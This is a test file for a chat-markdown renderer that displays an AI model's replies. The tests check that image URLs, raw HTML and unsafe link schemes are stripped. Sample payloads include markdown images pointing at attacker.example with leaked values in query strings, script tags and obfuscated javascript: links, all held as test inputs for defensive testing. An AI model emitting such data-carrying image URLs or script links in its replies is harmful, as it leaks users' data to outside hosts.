import {renderToStaticMarkup} from 'react-dom/server';
import {describe, expect, it} from 'vitest';
import {ChatMarkdown, safeLinkUrl} from '../components/analyst/chat-markdown';

const html = (text: string): string => renderToStaticMarkup(<ChatMarkdown text={text} />);

describe('assistant markdown: no images (exfiltration through a model-written URL)', () => {
  it('renders no <img> for an inline, a reference-style or a linked image', () => {
    for (const md of [
      '![x](https://attacker.example/p.png?d=revenue-12345)',
      '![x][r]\n\n[r]: https://attacker.example/p.png?d=1',
      '[![x](https://attacker.example/p.png?d=1)](https://attacker.example)',
      'Total is ₱1,200. ![](https://attacker.example/pixel.gif?q=1200)',
      '![x](data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=)',
    ]) {
      const out = html(md);
      expect(out, md).not.toMatch(/<img/i);
      expect(out, md).not.toContain('attacker.example/p');
      expect(out, md).not.toContain('pixel.gif');
    }
  });

  it('keeps the surrounding text', () => {
    expect(html('Total is ₱1,200. ![](https://attacker.example/pixel.gif?q=1200)')).toContain('Total is ₱1,200.');
  });

  it('raw HTML is not rendered either (no rehype-raw)', () => {
    const out = html('<img src="https://attacker.example/p.png"> <script>alert(1)</script>');
    expect(out).not.toMatch(/<img|<script/i);
  });
});

describe('assistant markdown: links', () => {
  it('an https link opens in a new tab with noopener', () => {
    const out = html('[the docs](https://example.com/a?b=1)');
    expect(out).toContain('href="https://example.com/a?b=1"');
    expect(out).toContain('target="_blank"');
    expect(out).toMatch(/rel="[^"]*noopener[^"]*"/);
  });

  it('javascript:, data:, mailto:, relative and protocol-relative links lose their href', () => {
    for (const md of ['[x](javascript:alert(1))', '[x](JaVaScRiPt:alert(1))', '[x](java\tscript:alert(1))', '[x](data:text/html,<b>)', '[x](mailto:a@b.co)', '[x](/reports)', '[x](//evil.example)', '[x](vbscript:msgbox)']) {
      const out = html(md);
      expect(out, md).not.toMatch(/href=/i);
      expect(out, md).toContain('x');
    }
  });

  it('safeLinkUrl keeps http(s) and drops the rest', () => {
    expect(safeLinkUrl('https://example.com')).toBe('https://example.com');
    expect(safeLinkUrl('http://example.com/x')).toBe('http://example.com/x');
    for (const v of ['javascript:alert(1)', 'mailto:a@b.co', '/relative', '//evil.example', '', 'not a url', 'ftp://x.example', 'data:image/png;base64,AAAA']) {
      expect(safeLinkUrl(v), v).toBe('');
    }
  });

  it('still renders ordinary markdown (bold, list, table)', () => {
    const out = html('**Hi**\n\n- a\n- b\n\n| a | b |\n|---|---|\n| 1 | 2 |');
    expect(out).toContain('<strong>Hi</strong>');
    expect(out).toContain('<li>a</li>');
    expect(out).toContain('<table>');
  });
});
